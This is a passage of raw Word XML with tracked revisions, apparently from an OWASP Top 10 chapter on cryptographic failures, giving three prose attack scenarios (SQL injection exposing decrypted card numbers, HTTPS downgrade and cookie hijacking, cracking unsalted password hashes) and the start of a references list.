        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41A57052" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D2D1C2" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CC5BC64" w14:textId="70D1C263" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1**: An application encrypts credit card numbers in a</w:t>
      </w:r>
      <w:del w:id="869" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="870" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923165"/>
      <w:moveFrom w:id="871" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">database using automatic database encryption. </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="870"/>
      <w:del w:id="872" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to </w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="873" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923166"/>
      <w:moveFrom w:id="874" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>retrieve credit card numbers in clear text.</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="873"/>
      <w:del w:id="875" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="78D93C04" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="876" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="877" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923165"/>
      <w:moveTo w:id="878" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">database using automatic database encryption. </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="877"/>
      <w:ins w:id="879" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>However, this data is</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="40E067C1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="880" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="881" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>automatically decrypted when retrieved, allowing a SQL injection flaw to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7BF92C27" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="882" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="883" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923166"/>
      <w:moveTo w:id="884" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>retrieve credit card numbers in clear text.</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="883"/>
    </w:p>
    <w:p w14:paraId="211FDA97" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E11A799" w14:textId="3A1B35F1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="885" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #2**: A site doesn't use or enforce TLS for all pages or</w:t>
      </w:r>
      <w:del w:id="886" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="66578321" w14:textId="52B9275D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="887" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">supports weak encryption. An attacker monitors network traffic </w:t>
      </w:r>
      <w:del w:id="888" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="889" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="890" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at</w:t>
      </w:r>
      <w:del w:id="891" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="464E6E11" w14:textId="2427EBDD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="892" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>an insecure wireless network), downgrades connections from HTTPS to</w:t>
      </w:r>
      <w:del w:id="893" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="49E15D4A" w14:textId="2A9035EF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="894" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>HTTP, intercepts requests, and steals the user's session cookie. The</w:t>
      </w:r>
      <w:del w:id="895" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="65C4B4ED" w14:textId="7971D196" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="896" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>attacker then replays this cookie and hijacks the user's (authenticated)</w:t>
      </w:r>
      <w:del w:id="897" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="465DC828" w14:textId="1E825770" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="898" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>session, accessing or modifying the user's private data. Instead of the</w:t>
      </w:r>
      <w:del w:id="899" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="16D47B21" w14:textId="6EEA5F19" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="900" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">above they could alter all transported data, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="901" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="902" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the recipient of a</w:t>
      </w:r>
      <w:del w:id="903" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7084573C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>money transfer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2013861F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="280D0757" w14:textId="304F29DC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="904" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #3**: The password database uses unsalted or simple hashes to</w:t>
      </w:r>
      <w:del w:id="905" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="16DF514D" w14:textId="6805A66D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="906" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>store everyone's passwords. A file upload flaw allows an attacker to</w:t>
      </w:r>
      <w:del w:id="907" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="103EAF66" w14:textId="3BCE84B5" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="908" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retrieve the password database. All the unsalted hashes can be exposed</w:t>
      </w:r>
      <w:del w:id="909" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4FDB86EA" w14:textId="7CC5D6D0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="910" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>with a rainbow table of pre-calculated hashes. Hashes generated by</w:t>
      </w:r>
      <w:del w:id="911" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="33D394F4" w14:textId="4CCED935" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="912" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>simple or fast hash functions may be cracked by GPUs, even if they were</w:t>
      </w:r>
      <w:del w:id="913" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5706153A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>salted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6941F1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2413754C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1987A7AC" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04383AC5" w14:textId="5D108366" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="914" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="915"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Proactive Controls: Protect Data</w:t>
      </w:r>
      <w:ins w:id="916" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Everywhere</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
